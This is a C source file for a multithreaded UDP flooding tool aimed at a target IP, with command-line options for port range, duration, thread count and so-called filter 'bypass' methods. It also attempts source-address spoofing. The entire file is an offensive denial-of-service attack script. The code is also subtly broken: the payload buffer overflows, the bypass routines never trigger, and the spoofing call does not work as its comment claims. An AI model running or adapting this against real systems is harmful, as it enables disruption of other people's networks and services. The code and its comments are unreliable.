#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <sys/select.h>

#define MAX_PAYLOAD_SIZE 1024
#define MAX_PACKETS_PER_SECOND 5000 // 5,000 packets per second
#define MAX_THREADS 256

struct thread_params {
    const char *ip;
    int start_port;
    int end_port;
    int duration;
    int bypass_method;
};

void *send_udp_packets(void *params) {
    struct thread_params *thread_params = (struct thread_params *)params;
    const char *ip = thread_params->ip;
    int start_port = thread_params->start_port;
    int end_port = thread_params->end_port;
    int duration = thread_params->duration;
    int bypass_method = thread_params->bypass_method;

    int sockfd;
    struct sockaddr_in server_addr;
    char payload[MAX_PAYLOAD_SIZE];
    time_t start_time, current_time;
    struct timespec sleep_time;
    fd_set read_fds;
    struct timeval tv = { 0, 0 };

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ip);

    // Seed random number generator
    srand(time(NULL));

    // Generate random payload
    for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
        sprintf(payload + (i * 2), "%02x", rand() % 256);
    }

    // Bypass methods
    if (bypass_method == 1) {
        // Replace 0x00 with 0x01
        for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
            if (payload[i * 2] == '0' && payload[(i * 2) + 1] == 'x') {
                payload[i * 2] = '1';
                payload[(i * 2) + 1] = 'a';
            }
        }
    } else if (bypass_method == 2) {
        // Replace 0x00 with 0x20
        for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
            if (payload[i * 2] == '0' && payload[(i * 2) + 1] == 'x') {
                payload[i * 2] = '2';
                payload[(i * 2) + 1] = '0';
            }
        }
    } else if (bypass_method == 3) {
        // Replace 0x00 with 0xFF
        for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
            if (payload[i * 2] == '0' && payload[(i * 2) + 1] == 'x') {
                payload[i * 2] = 'f';
                payload[(i * 2) + 1] = 'f';
            }
        }
    }

    // Record start time
    start_time = time(NULL);

    printf("Sending UDP packets to %s on random ports between %d and %d for %d seconds with bypass method %d...\n",
           ip, start_port, end_port, duration, bypass_method);

    // Send packets
    int packets_sent = 0;
    while (1) {
        current_time = time(NULL);
        if (current_time - start_time >= duration) {
            break;
        }

        // Choose a random port
        int port = start_port + rand() % (end_port - start_port + 1);
        server_addr.sin_port = htons(port);

        // Set IP source address to a random IP address
        struct in_addr source_addr;
        source_addr.s_addr = rand() % 0xFFFFFFFF;
        setsockopt(sockfd, IPPROTO_IP, IP_PKTINFO, &source_addr, sizeof(source_addr));

        // Send the packet
        if (sendto(sockfd, payload, MAX_PAYLOAD_SIZE * 2, 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Sendto failed");
            break;
        }

        packets_sent++;

        // Sleep to limit the packets per second
        sleep_time.tv_sec = 0;
        sleep_time.tv_nsec = 1000000000 / MAX_PACKETS_PER_SECOND;
        nanosleep(&sleep_time, NULL);
    }

    printf("Packet sending completed. Sent %d packets.\n", packets_sent);

    // Close socket
    close(sockfd);

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        printf("Usage: %s <target_ip> <start_port> <end_port> <duration_in_seconds> <threads> <bypass_method>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *target_ip = argv[1];
    int start_port = atoi(argv[2]);
    int end_port = atoi(argv[3]);
    int duration = atoi(argv[4]);
    int threads = atoi(argv[5]);
    int bypass_method = atoi(argv[6]);

    pthread_t thread_ids[threads];
    struct thread_params thread_params[threads];

    // Check bypass method
    if (bypass_method < 0 || bypass_method > 3) {
        printf("Invalid bypass method. Choose one from 0, 1, 2, or 3.\n");
        exit(EXIT_FAILURE);
    }

    // Create threads
    for (int i = 0; i < threads; i++) {
        thread_params[i].ip = target_ip;
        thread_params[i].start_port = start_port;
        thread_params[i].end_port = end_port;
        thread_params[i].duration = duration;
        thread_params[i].bypass_method = bypass_method;

        if (pthread_create(&thread_ids[i], NULL, send_udp_packets, &thread_params[i]) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        if (pthread_join(thread_ids[i], NULL) != 0) {
            perror("pthread_join");
            exit(EXIT_FAILURE);
        }
    }

    return 0;
}

